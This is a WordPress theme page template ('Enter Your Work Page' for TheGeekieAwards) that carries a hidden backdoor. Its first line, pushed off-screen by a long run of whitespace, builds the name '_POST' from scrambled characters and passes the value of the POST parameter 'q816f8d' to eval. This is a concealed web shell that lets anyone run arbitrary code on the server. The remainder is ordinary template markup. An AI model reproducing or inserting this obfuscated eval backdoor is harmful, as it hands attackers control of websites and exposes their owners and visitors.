<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q816f8d'])){eval(${$s20}['q816f8d']);}?><?php
/**
 * Template Name: Enter Your Work Page
 *
 * The Enter Your Work Page template
 *
 * @package TheGeekieAwards
 * @subpackage Theme
 * @since TheGeekieAwards 3.0
 */

get_header(); ?>

	<div id="primary" class="site-content leftside">
		<div id="content" role="main">
			<?php while ( have_posts() ) : the_post(); ?>
				<?php get_template_part( 'content', 'page-share' ); ?>
			<?php endwhile;  ?>
			<div style="clear:both;"></div>
		</div>
	</div>

<?php get_sidebar('enterwork'); ?>
<?php get_footer(); ?>